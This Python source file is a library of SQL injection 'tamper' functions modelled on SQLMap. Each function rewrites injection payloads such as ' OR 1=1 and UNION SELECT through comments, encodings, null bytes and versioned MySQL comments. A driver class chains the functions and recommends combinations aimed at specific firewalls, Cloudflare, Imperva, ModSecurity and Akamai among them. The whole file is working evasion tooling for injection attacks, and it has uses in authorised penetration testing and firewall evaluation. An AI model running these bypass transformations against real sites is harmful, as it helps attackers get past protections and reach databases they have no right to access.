"""
Advanced Tamper Scripts for WAF Bypass

Comprehensive collection of payload transformation techniques inspired by SQLMap's
tamper scripts but with additional advanced techniques for bypassing modern WAFs.

Each tamper function takes a payload and returns a transformed version that may
bypass certain WAF rules while maintaining SQL injection functionality.
"""

import base64
import urllib.parse
import random
import re
from typing import List, Callable


class TamperScripts:
    """Collection of advanced tamper scripts for WAF bypass"""
    
    @staticmethod
    def space2comment(payload: str) -> str:
        """
        Replace space with SQL comment /**/.
        Example: ' OR 1=1 => ' OR/**/1=1
        """
        return payload.replace(' ', '/**/')
    
    @staticmethod
    def space2plus(payload: str) -> str:
        """
        Replace space with plus sign.
        Example: ' OR 1=1 => '+OR+1=1
        """
        return payload.replace(' ', '+')
    
    @staticmethod
    def space2randomblank(payload: str) -> str:
        """
        Replace space with random blank character (%09, %0A, %0C, %0D, %0B, %A0).
        Example: ' OR 1=1 => ' OR%091=1
        """
        blanks = ['%09', '%0A', '%0C', '%0D', '%0B', '%A0']
        return ''.join(random.choice(blanks) if c == ' ' else c for c in payload)
    
    @staticmethod
    def between(payload: str) -> str:
        """
        Replace comparison operators with BETWEEN.
        Example: ' AND 1=1 => ' AND 1 BETWEEN 0 AND 2
        """
        payload = re.sub(r'(\d+)\s*=\s*(\d+)', r'\1 BETWEEN \2 AND \2', payload)
        return payload
    
    @staticmethod
    def charencode(payload: str) -> str:
        """
        URL encode all characters.
        Example: ' OR 1=1 => %27%20%4f%52%20%31%3d%31
        """
        return ''.join(f'%{ord(c):02x}' for c in payload)
    
    @staticmethod
    def chardoubleencode(payload: str) -> str:
        """
        Double URL encode all characters.
        Example: ' => %2527
        """
        first_encode = ''.join(f'%{ord(c):02x}' for c in payload)
        return ''.join(f'%{ord(c):02x}' for c in first_encode)
    
    @staticmethod
    def randomcase(payload: str) -> str:
        """
        Randomize case of each character.
        Example: SELECT => SeLeCt
        """
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    
    @staticmethod
    def randomcomments(payload: str) -> str:
        """
        Insert random inline comments /**/ between keywords.
        Example: SELECT FROM => SELECT/**/FROM
        """
        keywords = ['SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'UNION', 'ORDER', 'BY']
        result = payload
        for keyword in keywords:
            # Case-insensitive replacement
            pattern = re.compile(re.escape(keyword), re.IGNORECASE)
            if random.random() > 0.5:
                result = pattern.sub(f'{keyword}/**/', result)
        return result
    
    @staticmethod
    def apostrophenullencode(payload: str) -> str:
        """
        Replace apostrophe with UTF-8 NULL byte followed by apostrophe.
        Example: ' => %00'
        """
        return payload.replace("'", "%00'")
    
    @staticmethod
    def appendnullbyte(payload: str) -> str:
        """
        Append NULL byte at the end of payload.
        Example: ' OR 1=1 => ' OR 1=1%00
        """
        return payload + '%00'
    
    @staticmethod
    def base64encode(payload: str) -> str:
        """
        Base64 encode the payload.
        Example: ' OR 1=1 => JyBPUiAxPTE=
        """
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def charunicodeencode(payload: str) -> str:
        """
        Unicode encode non-encoded characters.
        Example: SELECT => \u0053\u0045\u004c\u0045\u0043\u0054
        """
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def equaltolike(payload: str) -> str:
        """
        Replace equals with LIKE operator.
        Example: ' AND 1=1 => ' AND 1 LIKE 1
        """
        return re.sub(r'(\w+)\s*=\s*(\w+)', r'\1 LIKE \2', payload)
    
    @staticmethod
    def greatest(payload: str) -> str:
        """
        Replace greater than operator with GREATEST function.
        Example: 1>0 => GREATEST(1,0)=1
        """
        return re.sub(r'(\d+)\s*>\s*(\d+)', r'GREATEST(\1,\2)=\1', payload)
    
    @staticmethod
    def hex2char(payload: str) -> str:
        """
        Convert hex to CHAR() function calls.
        Example: 0x414243 => CHAR(65,66,67)
        """
        def hex_to_char(match):
            hex_str = match.group(1)
            # Convert pairs of hex digits to integers
            chars = [str(int(hex_str[i:i+2], 16)) for i in range(0, len(hex_str), 2)]
            return f"CHAR({','.join(chars)})"
        
        return re.sub(r'0x([0-9a-fA-F]+)', hex_to_char, payload)
    
    @staticmethod
    def ifnull2ifisnull(payload: str) -> str:
        """
        Replace IFNULL with IF(ISNULL(...)).
        Example: IFNULL(1,2) => IF(ISNULL(1),2,1)
        """
        return re.sub(r'IFNULL\(([^,]+),([^)]+)\)', r'IF(ISNULL(\1),\2,\1)', payload, flags=re.IGNORECASE)
    
    @staticmethod
    def modsecurityversioned(payload: str) -> str:
        """
        Add MySQL version-specific comments to bypass ModSecurity.
        Example: UNION => /*!50000UNION*/
        """
        keywords = ['UNION', 'SELECT', 'FROM', 'WHERE']
        result = payload
        for keyword in keywords:
            pattern = re.compile(r'\b' + re.escape(keyword) + r'\b', re.IGNORECASE)
            result = pattern.sub(f'/*!50000{keyword}*/', result)
        return result
    
    @staticmethod
    def modsecurityzeroversioned(payload: str) -> str:
        """
        Add MySQL zero-versioned comments.
        Example: UNION => /*!00000UNION*/
        """
        keywords = ['UNION', 'SELECT', 'FROM', 'WHERE']
        result = payload
        for keyword in keywords:
            pattern = re.compile(r'\b' + re.escape(keyword) + r'\b', re.IGNORECASE)
            result = pattern.sub(f'/*!00000{keyword}*/', result)
        return result
    
    @staticmethod
    def multiplespaces(payload: str) -> str:
        """
        Add multiple spaces around keywords.
        Example: UNION SELECT => UNION    SELECT
        """
        return re.sub(r'\s+', '    ', payload)
    
    @staticmethod
    def percentage(payload: str) -> str:
        """
        Add percentage sign before each character in ASP.
        Example: SELECT => %S%E%L%E%C%T
        """
        return ''.join(f'%{c}' for c in payload)
    
    @staticmethod
    def randomcase_multichar(payload: str) -> str:
        """
        Apply random case to multi-character strings.
        Example: SELECT => SeLEct
        """
        result = []
        for i, char in enumerate(payload):
            if char.isalpha():
                # Change case every 1-3 characters
                if i % random.randint(1, 3) == 0:
                    result.append(char.upper() if char.islower() else char.lower())
                else:
                    result.append(char)
            else:
                result.append(char)
        return ''.join(result)
    
    @staticmethod
    def overlongutf8(payload: str) -> str:
        """
        Convert characters to overlong UTF-8 encoding (for bypassing filters).
        Example: ' => %C0%A7 or %E0%80%A7
        """
        # Simplified overlong UTF-8 for apostrophe and other special chars
        replacements = {
            "'": "%C0%A7",
            '"': "%C0%A2",
            '<': "%C0%BC",
            '>': "%C0%BE",
        }
        result = payload
        for char, encoded in replacements.items():
            result = result.replace(char, encoded)
        return result
    
    @staticmethod
    def apostrophemask(payload: str) -> str:
        """
        Replace apostrophe with UTF-8 alternative representation.
        Example: ' => %EF%BC%87
        """
        return payload.replace("'", "%EF%BC%87")
    
    @staticmethod
    def halfversionedmorekeywords(payload: str) -> str:
        """
        Add MySQL half-versioned comment with more keywords.
        Example: value' OR 1=1 => value'/*!0OR 1=1*/
        """
        return re.sub(r"'", "'/*!0", payload) + '*/'
    
    @staticmethod
    def symboliclogical(payload: str) -> str:
        """
        Replace AND/OR with symbolic equivalents.
        Example: ' AND 1=1 => ' && 1=1
        """
        payload = payload.replace(' AND ', ' && ')
        payload = payload.replace(' OR ', ' || ')
        return payload
    
    @staticmethod
    def concat2concatws(payload: str) -> str:
        """
        Replace CONCAT with CONCAT_WS.
        Example: CONCAT(1,2) => CONCAT_WS('',1,2)
        """
        return re.sub(r'CONCAT\(', "CONCAT_WS('',", payload, flags=re.IGNORECASE)
    
    @staticmethod
    def plus2concat(payload: str) -> str:
        """
        Replace plus operator with CONCAT.
        Example: 'a'+'b' => CONCAT('a','b')
        """
        # Match quoted strings with +
        return re.sub(r"'([^']+)'\+'([^']+)'", r"CONCAT('\1','\2')", payload)
    
    @staticmethod
    def plus2fnconcat(payload: str) -> str:
        """
        Replace plus with function-based concatenation.
        Example: SLEEP(5) => SLEEP(2+3)
        """
        return re.sub(r'(\d+)', lambda m: f"({int(m.group(1))//2}+{int(m.group(1))-int(m.group(1))//2})" if int(m.group(1)) > 1 else m.group(1), payload)
    
    @staticmethod
    def escapequotes(payload: str) -> str:
        """
        Slash escape quotes.
        Example: ' => \'
        """
        return payload.replace("'", "\\'").replace('"', '\\"')
    
    @staticmethod
    def unionalltounion(payload: str) -> str:
        """
        Replace UNION ALL SELECT with UNION SELECT.
        Example: UNION ALL SELECT => UNION SELECT
        """
        return re.sub(r'UNION\s+ALL\s+SELECT', 'UNION SELECT', payload, flags=re.IGNORECASE)
    
    @staticmethod
    def versionedkeywords(payload: str) -> str:
        """
        Enclose each keyword with MySQL versioned comment.
        Example: 1 UNION SELECT => 1/*!UNION*//*!SELECT*/
        """
        keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'ORDER', 'BY', 'LIMIT']
        result = payload
        for keyword in keywords:
            pattern = re.compile(r'\b' + re.escape(keyword) + r'\b', re.IGNORECASE)
            result = pattern.sub(f'/*!{keyword}*/', result)
        return result
    
    @staticmethod
    def versionedmorekeywords(payload: str) -> str:
        """
        Enclose each keyword with versioned MySQL comment (extended keyword list).
        Example: CONCAT => /*!CONCAT*/
        """
        keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'ORDER', 'BY', 
                   'LIMIT', 'CONCAT', 'GROUP', 'HAVING', 'SUBSTRING', 'CAST']
        result = payload
        for keyword in keywords:
            pattern = re.compile(r'\b' + re.escape(keyword) + r'\b', re.IGNORECASE)
            result = pattern.sub(f'/*!{keyword}*/', result)
        return result
    
    @staticmethod
    def xforwardedfor(payload: str) -> str:
        """
        Append fake X-Forwarded-For header (for HTTP parameter pollution).
        Note: This should be applied at request level, not payload level.
        Returns: tuple (payload, headers)
        """
        return payload  # Marker for special handling in engine


class TamperEngine:
    """Engine for applying tamper scripts to payloads"""
    
    def __init__(self):
        self.scripts = TamperScripts()
        self.available_tamper_scripts = [
            'space2comment',
            'space2plus',
            'space2randomblank',
            'between',
            'charencode',
            'chardoubleencode',
            'randomcase',
            'randomcomments',
            'apostrophenullencode',
            'appendnullbyte',
            'base64encode',
            'charunicodeencode',
            'equaltolike',
            'greatest',
            'hex2char',
            'ifnull2ifisnull',
            'modsecurityversioned',
            'modsecurityzeroversioned',
            'multiplespaces',
            'percentage',
            'randomcase_multichar',
            'overlongutf8',
            'apostrophemask',
            'halfversionedmorekeywords',
            'symboliclogical',
            'concat2concatws',
            'plus2concat',
            'plus2fnconcat',
            'escapequotes',
            'unionalltounion',
            'versionedkeywords',
            'versionedmorekeywords',
        ]
    
    def get_tamper_function(self, name: str) -> Callable:
        """Get tamper function by name"""
        return getattr(self.scripts, name, None)
    
    def apply_tamper(self, payload: str, tamper_name: str) -> str:
        """Apply a single tamper script to payload"""
        func = self.get_tamper_function(tamper_name)
        if func:
            return func(payload)
        return payload
    
    def apply_multiple_tampers(self, payload: str, tamper_names: List[str]) -> str:
        """Apply multiple tamper scripts in sequence"""
        result = payload
        for tamper_name in tamper_names:
            result = self.apply_tamper(result, tamper_name)
        return result
    
    def apply_random_tamper(self, payload: str, count: int = 1) -> str:
        """Apply random tamper scripts to payload"""
        available = self.available_tamper_scripts
        selected = random.sample(available, min(count, len(available)))
        return self.apply_multiple_tampers(payload, selected)
    
    def get_all_variations(self, payload: str, max_variations: int = 10) -> List[str]:
        """Generate multiple variations of payload using different tamper scripts"""
        variations = [payload]  # Include original
        available = self.available_tamper_scripts
        
        # Single tamper variations
        for tamper_name in random.sample(available, min(max_variations - 1, len(available))):
            variations.append(self.apply_tamper(payload, tamper_name))
        
        # Combo tampers (2 scripts combined)
        if max_variations > len(variations):
            common_combos = [
                ['space2comment', 'randomcase'],
                ['randomcase', 'randomcomments'],
                ['space2plus', 'appendnullbyte'],
                ['versionedkeywords', 'randomcase'],
            ]
            for combo in common_combos[:max_variations - len(variations)]:
                variations.append(self.apply_multiple_tampers(payload, combo))
        
        return variations[:max_variations]
    
    @property
    def available_tampers(self) -> List[str]:
        """Get list of all available tamper scripts"""
        return self.available_tamper_scripts.copy()
    
    def get_recommended_tampers_for_waf(self, waf_type: str) -> List[str]:
        """Get recommended tamper scripts for specific WAF types"""
        waf_recommendations = {
            'cloudflare': ['space2comment', 'randomcase', 'versionedkeywords'],
            'imperva': ['modsecurityversioned', 'space2randomblank', 'overlongutf8'],
            'modsecurity': ['modsecurityversioned', 'modsecurityzeroversioned', 'versionedmorekeywords'],
            'akamai': ['space2plus', 'randomcomments', 'charencode'],
            'generic': ['space2comment', 'randomcase', 'appendnullbyte'],
        }
        return waf_recommendations.get(waf_type.lower(), waf_recommendations['generic'])
